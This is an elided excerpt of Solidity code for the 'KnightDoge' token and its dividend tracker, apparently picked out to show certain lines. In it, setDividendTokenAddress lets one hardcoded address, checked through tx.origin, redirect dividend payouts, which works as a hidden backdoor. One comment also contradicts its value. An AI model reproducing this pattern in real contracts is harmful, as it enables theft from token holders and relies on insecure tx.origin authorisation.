...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x59A092d876A2FF4A049eA4cB8aA69A95cA107A3c, "Only owner can change dividend contract address");
...
contract KnightDoge is ERC20, Ownable {
    ...
    constructor() ERC20("KNIGHT DOGE", "KNIGHTDOGE") {
    	...
    	marketingWallet = 0xeC70292cf5c5D46DBB37Bc72319de3BCd05394e3;
    ...
    function afterPreSale() external onlyOwner {
        ...
        maxBuyTranscationAmount = 500000 * (10**18);
        maxSellTransactionAmount = 500000 * (10**18);
        maxWalletToken = 500000 * (10**18);
    }
...
contract DogeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("KnightDoge_Doge_Dividend_Tracker", "KnightDoge_Doge_Dividend_Tracker", 0xbA2aE424d960c26247Dd6c32edC70B295c744C43) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 20 * (10**18); //must hold 2000000+ tokens
    }
